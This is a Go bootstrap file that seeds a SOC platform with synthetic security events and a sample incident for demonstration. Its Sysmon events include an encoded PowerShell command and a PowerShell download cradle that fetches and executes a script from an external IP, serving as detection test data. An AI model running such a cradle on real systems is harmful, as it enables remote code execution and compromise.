package bootstrap

import (
	"context"
	"fmt"
	"time"

	"github.com/kcsp/platform/internal/core"
	"github.com/kcsp/platform/internal/pipeline"
	"github.com/kcsp/platform/internal/soc"
	"github.com/kcsp/platform/internal/store"
)

type DemoSeeder struct {
	Store    *store.Memory
	Pipeline *pipeline.Engine
	SOC      *soc.Service
}

func (s DemoSeeder) Seed(ctx context.Context) error {
	tenantID := core.DefaultTenantID
	s.Store.ResetTenant(tenantID)
	s.Pipeline.ResetTenant(tenantID)
	now := time.Now().UTC()

	events := []core.CanonicalEvent{
		{
			ID: "evt-demo-dns-001", EventTime: now.Add(-52 * time.Minute), Category: "dns_activity", ActivityName: "DNS query",
			Source:      core.EventSource{Vendor: "Microsoft", Product: "Windows DNS", Type: "dns"},
			Device:      core.DeviceRef{ID: "asset-dns-01", Hostname: "dns-01", IP: "10.20.1.12", Department: "Infrastructure", Criticality: 5},
			SrcEndpoint: core.EndpointRef{IP: "10.30.18.44"}, DstEndpoint: core.EndpointRef{IP: "10.20.1.12", Port: 53},
			Raw: core.RawRef{Message: `{"query":"library.kutb.edu.kz","type":"A","response":"10.20.8.14"}`},
		},
		{
			ID: "evt-demo-ps-001", EventTime: now.Add(-31 * time.Minute), Category: "process_activity", ActivityName: "Process created",
			Source: core.EventSource{Vendor: "Microsoft", Product: "Sysmon", Type: "endpoint"},
			Schema: core.SchemaRef{ClassUID: 1007}, User: core.UserRef{ID: "id-admin-soc", Name: "KUTB\\a.sadykov", IsPrivileged: true},
			Device:  core.DeviceRef{ID: "asset-dc-01", Hostname: "dc-01", IP: "10.20.1.10", Department: "Infrastructure", Criticality: 5},
			Process: core.ProcessRef{Name: "powershell.exe", PID: 6140, ParentName: "winword.exe", CommandLine: `powershell.exe -NoP -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA`},
			Raw:     core.RawRef{Message: `{"EventID":1,"Computer":"dc-01.kutb.local","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -NoP -EncodedCommand SQBFAFgA...","User":"KUTB\\a.sadykov"}`},
		},
		{
			ID: "evt-demo-ps-002", EventTime: now.Add(-28 * time.Minute), Category: "process_activity", ActivityName: "Process created",
			Source: core.EventSource{Vendor: "Microsoft", Product: "Sysmon", Type: "endpoint"},
			Schema: core.SchemaRef{ClassUID: 1007}, User: core.UserRef{ID: "id-admin-soc", Name: "KUTB\\a.sadykov", IsPrivileged: true},
			Device:  core.DeviceRef{ID: "asset-dc-01", Hostname: "dc-01", IP: "10.20.1.10", Department: "Infrastructure", Criticality: 5},
			Process: core.ProcessRef{Name: "powershell.exe", PID: 6288, ParentName: "powershell.exe", CommandLine: `powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://185.80.219.12/a.ps1')`},
			Raw:     core.RawRef{Message: `{"EventID":1,"Computer":"dc-01.kutb.local","Image":"powershell.exe","CommandLine":"IEX (New-Object Net.WebClient).DownloadString('http://185.80.219.12/a.ps1')"}`},
		},
		{
			ID: "evt-demo-benign-ps", EventTime: now.Add(-25 * time.Minute), Category: "process_activity", ActivityName: "Process created",
			Source: core.EventSource{Vendor: "Microsoft", Product: "Sysmon", Type: "endpoint"},
			User:   core.UserRef{Name: "KUTB\\it.operator"}, Device: core.DeviceRef{ID: "asset-it-17", Hostname: "it-ws-17", IP: "10.30.4.17", Department: "IT", Criticality: 2},
			Process: core.ProcessRef{Name: "powershell.exe", PID: 3002, ParentName: "explorer.exe", CommandLine: `powershell.exe Get-Service -Name Spooler`},
			Raw:     core.RawRef{Message: `{"EventID":1,"Image":"powershell.exe","CommandLine":"Get-Service -Name Spooler"}`},
		},
		{
			ID: "evt-demo-fw-001", EventTime: now.Add(-18 * time.Minute), Category: "network_activity", ActivityName: "Connection denied",
			Source:      core.EventSource{Vendor: "Fortinet", Product: "FortiGate", Type: "firewall"},
			SrcEndpoint: core.EndpointRef{IP: "10.30.18.44", Port: 53912}, DstEndpoint: core.EndpointRef{IP: "185.80.219.12", Port: 443},
			SecurityResult: core.SecurityResult{Action: "deny", Outcome: "blocked"},
			Raw:            core.RawRef{Message: `date=2026-08-17 action=deny srcip=10.30.18.44 dstip=185.80.219.12 dstport=443 service=HTTPS`},
		},
	}
	for i, user := range []string{"student01", "student02", "student03", "teacher07", "svc-library"} {
		events = append(events, core.CanonicalEvent{
			ID: fmt.Sprintf("evt-demo-auth-%03d", i+1), EventTime: now.Add(time.Duration(-12+i) * time.Minute),
			Category: "authentication", ActivityName: "Authentication failed",
			Source: core.EventSource{Vendor: "Microsoft", Product: "Active Directory", Type: "identity"},
			User:   core.UserRef{Name: "KUTB\\" + user}, Device: core.DeviceRef{ID: "asset-dc-02", Hostname: "dc-02", IP: "10.20.1.11", Department: "Infrastructure", Criticality: 5},
			SrcEndpoint: core.EndpointRef{IP: "185.80.219.12"}, SecurityResult: core.SecurityResult{Action: "logon", Outcome: "failure"},
			Raw: core.RawRef{Message: fmt.Sprintf(`{"EventID":4625,"TargetUserName":"%s","IpAddress":"185.80.219.12","Status":"0xC000006A"}`, user)},
		})
	}

	for _, event := range events {
		if _, err := s.Pipeline.Ingest(ctx, tenantID, event); err != nil {
			return fmt.Errorf("seed event %s: %w", event.ID, err)
		}
	}

	alerts := s.Store.ListAlerts(tenantID, store.AlertFilter{Limit: 100})
	for _, alert := range alerts {
		if alert.Rule.ID != pipeline.PowerShellRuleID {
			continue
		}
		incident, _, err := s.SOC.CreateIncident(tenantID, "system:demo-seed", soc.CreateIncidentInput{
			Title:    "Possible PowerShell compromise on dc-01",
			Summary:  "Encoded PowerShell and a download cradle executed under a privileged identity on a critical domain controller.",
			Assignee: "Данияр Нұрлан", AlertIDs: []string{alert.ID}, RequestID: "demo-seed",
		})
		if err != nil {
			return fmt.Errorf("seed incident: %w", err)
		}
		incident, err = s.SOC.UpdateIncident(tenantID, incident.ID, "system:demo-seed", soc.IncidentPatch{Status: "TRIAGE", Version: incident.Version, RequestID: "demo-seed"})
		if err != nil {
			return fmt.Errorf("seed incident triage: %w", err)
		}
		_, err = s.SOC.UpdateIncident(tenantID, incident.ID, "system:demo-seed", soc.IncidentPatch{
			Status: "INVESTIGATION", Comment: "Scope review started; preserving endpoint and identity telemetry.", Version: incident.Version, RequestID: "demo-seed",
		})
		if err != nil {
			return fmt.Errorf("seed incident investigation: %w", err)
		}
		break
	}
	s.Store.AppendAudit(core.AuditEntry{
		TenantID: tenantID, Actor: "system:bootstrap", Action: "demo.seeded", ResourceType: "tenant", ResourceID: tenantID,
		Outcome: "success", Metadata: map[string]interface{}{"profile": "embedded-dev", "events": len(events)},
	})
	return nil
}
